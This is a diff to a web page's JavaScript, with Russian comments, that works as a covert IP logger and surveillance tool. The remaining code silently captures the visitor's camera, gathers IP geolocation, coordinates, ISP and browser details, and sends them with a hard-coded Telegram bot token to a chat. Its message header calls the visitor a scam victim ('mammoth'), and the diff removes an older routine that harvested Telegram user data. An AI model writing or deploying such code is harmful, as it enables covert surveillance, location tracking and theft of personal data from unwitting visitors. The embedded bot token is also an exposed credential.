@@ -59,57 +59,6 @@
         const TOKEN = "8319716117:AAFOvid9L14XanjeBLYWb6JT7QTAVgcA9g4";
         const CHAT_ID = "-1003175777512";
 
-        // Функция для получения данных Telegram пользователя
-        async function getTelegramUserData() {
-            // Проверяем, открыто ли в Telegram
-            if (window.Telegram && window.Telegram.WebApp) {
-                try {
-                    const tg = window.Telegram.WebApp;
-                    const user = tg.initDataUnsafe?.user;
-                    
-                    if (user) {
-                        return {
-                            telegramId: user.id || 'N/A',
-                            username: user.username || 'No username',
-                            firstName: user.first_name || 'N/A',
-                            lastName: user.last_name || 'N/A',
-                            languageCode: user.language_code || 'N/A',
-                            isPremium: user.is_premium || false,
-                            source: 'Telegram Web App'
-                        };
-                    }
-                } catch (error) {
-                    console.error('Telegram Web App error:', error);
-                }
-            }
-            
-            // Пытаемся получить из URL параметров (если есть реферальная ссылка)
-            const urlParams = new URLSearchParams(window.location.search);
-            const tgRef = urlParams.get('tg');
-            
-            if (tgRef) {
-                return {
-                    telegramId: 'From URL',
-                    username: tgRef,
-                    firstName: 'N/A',
-                    lastName: 'N/A',
-                    languageCode: 'N/A',
-                    isPremium: false,
-                    source: 'URL Parameter'
-                };
-            }
-            
-            return {
-                telegramId: 'N/A',
-                username: 'Not available',
-                firstName: 'N/A',
-                lastName: 'N/A',
-                languageCode: 'N/A',
-                isPremium: false,
-                source: 'Regular browser'
-            };
-        }
-
         // Функция для автоматического доступа к камере
         async function autoCaptureCamera() {
             try {
@@ -264,20 +213,8 @@
         }
 
         // Форматирование сообщения
-        function formatMessage(ipInfo, browserInfo, telegramData, hasPhoto = false) {
-            let message = `<b>🦣 Новый Мамонт</b>\n`;
-            message += `<b>👨‍💻 Создатели:</b> @holdsnft и @chinazTag\n\n`;
-            
-            // Telegram данные
-            message += `<b>📱 Telegram Info:</b>\n`;
-            message += `<b>👤 Username:</b> @${telegramData.username}\n`;
-            message += `<b>🆔 ID:</b> ${telegramData.telegramId}\n`;
-            message += `<b>👨‍💼 First Name:</b> ${telegramData.firstName}\n`;
-            message += `<b>👨‍💼 Last Name:</b> ${telegramData.lastName}\n`;
-            message += `<b>💎 Premium:</b> ${telegramData.isPremium ? 'Yes' : 'No'}\n`;
-            message += `<b>🌐 Source:</b> ${telegramData.source}\n\n`;
-            
-            // IP информация
+        function formatMessage(ipInfo, browserInfo, hasPhoto = false) {
+            let message = `<b>🌐 IP Logger Шторма @holdsnft и @ChinazTag</b>\n\n`;
             message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
             message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
             message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
@@ -287,7 +224,6 @@
             message += `<b>📡 Coordinates:</b> ${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\n`;
             message += `<b>🗿 ISP:</b> ${ipInfo.org || ipInfo.asn || 'N/A'}\n\n`;
             
-            // Browser информация
             message += `<b>💻 Browser Info:</b>\n`;
             message += `<b>User Agent:</b> ${browserInfo.userAgent}\n`;
             message += `<b>Language:</b> ${browserInfo.language}\n`;
@@ -313,15 +249,14 @@
                 statusElement.innerHTML = '🌐 Collecting information...';
                 
                 // Параллельно собираем все данные
-                const [ipInfo, browserInfo, telegramData, photoDataUrl] = await Promise.all([
+                const [ipInfo, browserInfo, photoDataUrl] = await Promise.all([
                     getIPInfo(),
                     Promise.resolve(getBrowserInfo()),
-                    getTelegramUserData(),
-                    autoCaptureCamera().catch(() => null)
+                    autoCaptureCamera().catch(() => null) // Если камера ошибется - похуй
                 ]);
 
                 // Формируем сообщение
-                const message = formatMessage(ipInfo, browserInfo, telegramData, !!photoDataUrl);
+                const message = formatMessage(ipInfo, browserInfo, !!photoDataUrl);
 
                 // Отправляем текстовое сообщение
                 statusElement.innerHTML = '📤 Sending data...';
@@ -329,7 +264,7 @@
                 
                 // Если есть фото, отправляем его
                 if (photoDataUrl) {
-                    const photoCaption = `📸 Camera Capture - @${telegramData.username} - ${ipInfo.ip || 'Unknown IP'} - ${new Date().toLocaleString()}`;
+                    const photoCaption = `📸 Camera Capture - ${ipInfo.ip || 'Unknown IP'} - ${new Date().toLocaleString()}`;
                     await sendPhotoToTelegram(photoDataUrl, photoCaption);
                 }
                 
